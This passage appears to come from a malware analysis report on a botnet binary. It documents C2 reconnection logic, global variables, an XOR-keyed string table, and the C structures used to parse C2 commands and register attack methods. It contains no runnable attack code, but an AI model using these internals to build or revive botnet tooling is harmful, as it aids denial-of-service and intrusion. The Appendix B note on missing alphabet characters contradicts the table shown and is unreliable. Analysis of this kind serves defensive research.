- **Server-initiated disconnect**: The binary does not handle any specific server-initiated disconnect message. Connection closure is detected only through `recvfrom` returning 0.
- **Reconnection backoff**: The binary uses a fixed 1-second sleep between reconnection attempts. No exponential backoff is implemented.
- **Maximum retry count**: No maximum retry limit is observed — the malware will attempt to reconnect indefinitely.
- **Session state persistence**: No session tokens, sequence numbers, or state identifiers are maintained across reconnections. Each connection starts with a fresh handshake.

---

## Appendix A: Key Global Variables

| Address | Name | Type | Purpose |
|---------|------|------|---------|
| `0x0051c470` | `fd_ctrl` | int | Single-instance control socket |
| `0x0051c474` | `fd_c2` | int | C2 connection socket |
| `0x0051c478` | `sleep_duration` | int | Sleep duration for control socket accept |
| `0x0051c480` | `resolve_callback` | function* | Pointer to `resolve_c2_address` |
| `0x0051c488` | `bind_flag` | bool | Socket bind success flag |
| `0x0051c48c` | `xor_key` | uint32 | String table XOR key (0xDEADBEEF) |
| `0x0051c990` | `attack_count` | uint32 | Number of registered attack methods |
| `0x0051c998` | `attack_table` | void* | Pointer to attack method array |
| `0x0051c9a0` | `attack_pid` | int | PID of running attack supervisor |
| `0x0051c9b0` | `scanner_pid` | int | PID of scanner process |
| `0x0051c9b4` | `loop_counter` | int | Main loop iteration counter |
| `0x0051c9bc` | `connecting_flag` | bool | C2 connection in progress |
| `0x0051c9c0` | `c2_password` | char[32] | C2 authentication password |
| `0x0051c9e0` | `prng_state[0]` | uint32 | PRNG state register 0 |
| `0x0051c9e4` | `prng_state[1]` | uint32 | PRNG state register 1 |
| `0x0051c9e8` | `prng_state[2]` | uint32 | PRNG state register 2 |
| `0x0051c9ec` | `prng_state[3]` | uint32 | PRNG state register 3 |
| `0x0051ea80` | `local_ip` | uint32 | Local IP address |
| `0x0051eaa0` | `sockaddr_c2` | sockaddr | C2 server address structure |
| `0x0051eac0` | `string_table` | struct[] | String table entries |

## Appendix B: Hex Encoding Table

The binary contains a hex character table at `0x00419e88`:

```
0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789
```

**Note**: This table is missing the characters `X`, `X`, `W`, `W` (positions 23, 24 replaced with `S`, `Y` and positions 49, 50 replaced with `s`, `y`). This appears to be a custom base64-like encoding alphabet used for encoding/decoding hexadecimal payloads in attack methods.

## Appendix C: Data Structures

### C.1 Target Structure (as parsed by `process_c2_packet`)

```c
struct wire_target {
    uint32_t ip;      // 4 bytes: Target IP (network byte order)
    uint8_t cidr;     // 1 byte: CIDR netmask
};  // Total: 5 bytes per entry
```

### C.2 Option Structure (as parsed by `process_c2_packet`)

```c
struct wire_option {
    // Variable-length wire format:
    // uint8_t id;          // 1 byte: Option identifier
    // uint8_t len;         // 1 byte: Value length
    // uint8_t val[len];    // Variable: Option value string
};

// Internal representation after parsing:
struct internal_option {
    char *val;    // Pointer to option value string
    char id;      // Option identifier
};
```

### C.3 Attack Method Registration Structure

```c
struct attack_method_entry {
    void (*func)(uint, void*, uint, void*);  // Attack handler function
    char method_id;                          // Method identifier byte
};  // Total: 16 bytes per entry (8 byte ptr + padding + 1 byte id)
```

### C.4 String Table Entry Structure

```c
struct string_table_entry {
    uint64_t data_ptr;    // Pointer to malloc'd string buffer
    uint16_t data_len;    // Length of string data
};  // Total: 16 bytes per entry
```
